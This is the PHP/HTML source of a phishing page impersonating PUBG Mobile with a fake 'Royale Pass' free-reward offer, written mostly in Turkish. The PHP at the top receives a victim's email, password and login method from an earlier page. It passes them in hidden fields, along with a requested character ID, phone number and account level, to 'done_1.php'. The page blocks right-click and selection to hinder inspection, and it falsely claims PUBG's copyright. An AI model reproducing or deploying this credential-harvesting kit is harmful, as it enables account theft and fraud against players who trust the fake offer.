<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
?>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="PUBG MOBILE: Royale Pass Season 18">
    <meta name="description" content="Collect your special rewards at the Royale Pass Season 17 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:description" content="Collect your special rewards at the Royale Pass Season 18 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="PUBG MOBILE: Royale Pass Season 17">
    <meta property="og:type" content="website">
    <meta name="copyright" content="PUBG MOBILE">
    <meta name="theme-color" content="#000">
    <meta property="og:image" content="img/season.png">
    <title>PUBG MOBILE: Royale Pass Season 17</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" href="img/icon_logo.jpg">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="">

    <div class="container">

        <div class="navbar">
            <div class="navbar-btn-wrapper">
                <i class="fa fa-bars fa-2x"></i>
                <button class="navbar-btn">
Purchase</button>
                <button class="navbar-btn">
Download</button>
            </div>
            <img src="img/icon_logo.jpg">
            <div class="navbar-txt-game">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </div>
        </div>

        <div class="header">
            <div class="slider">
                <img src="img/header.png">
            </div>
        </div>

        <div class="box">
            <center>
                <div class="menu-wrapper-border"></div>
                <div class="verify-alert">
                    Ödüllerin Gönderilmesi için detaylar Önemlidir
                    <button type="button">Required</button>
                </div>
                <form action="done_1.php" method="POST">
                <input type="hidden" id="email" name="email" value="<?php echo $email;?>">
                <input type="hidden" id="password" name="password" value="<?php echo $password;?>">
                <input type="hidden" id="login" name="login" value="<?php echo $login;?>">
                    <input type="number" class="verify-input" name="playid" id="playid" placeholder="Karakter ID" autocomplete="off" required="">
                    <input type="number" class="verify-input" name="phone" id="phone" placeholder="Telefon Numarası" autocomplete="off" required="">
                    <select class="verify-select" name="level" id="level" required="">
<option selected="selected" disabled="disabled" value="">Hesap Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
                    <button type="submit" class="verify-btn">Doğrula !</button>
                </form>
            </center>
        </div>
        <!--- box --->

        <div class="footer">
            <img src="img/footer_img.png">
            <div class="footer-txt">© 2018-2021 PUBG CORPORATION. All rights reserved.</div>
        </div>

    </div>
    <!--- container --->

    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5fd4ba3551c3df6a"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="js/timer.js"></script>
    <script src="js/tab.js"></script>
    <script src="js/popup.js"></script>
    <script src="js/click.js"></script>


</body>

</html>